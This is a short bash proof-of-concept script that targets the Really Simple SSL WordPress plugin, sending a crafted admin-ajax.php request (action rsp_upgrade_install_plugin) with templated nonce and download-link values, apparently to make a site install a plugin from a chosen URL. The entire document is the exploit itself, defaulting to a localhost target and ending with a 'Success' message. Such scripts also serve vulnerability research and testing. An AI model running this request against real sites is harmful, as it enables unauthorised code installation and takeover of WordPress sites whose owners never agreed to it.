#!/usr/bin/env bash
# PoC: really-simple-ssl wp.fs.plugin_install_url
set -euo pipefail
BASE="${TARGET_URL:-http://localhost:8000}"

echo "=== 1) Send exploit payload ==="
curl -sS -D - "$BASE/wp-admin/admin-ajax.php?action=rsp_upgrade_install_plugin&install_pro=true&license=iridium&item_id=1&plugin=rsssl_pro&token={{upgrade_to_pro_nonce}}&download_link={{plugin_download_link}}" | head -c 2000
echo

echo "Success: check output above for expected vulnerability impact."
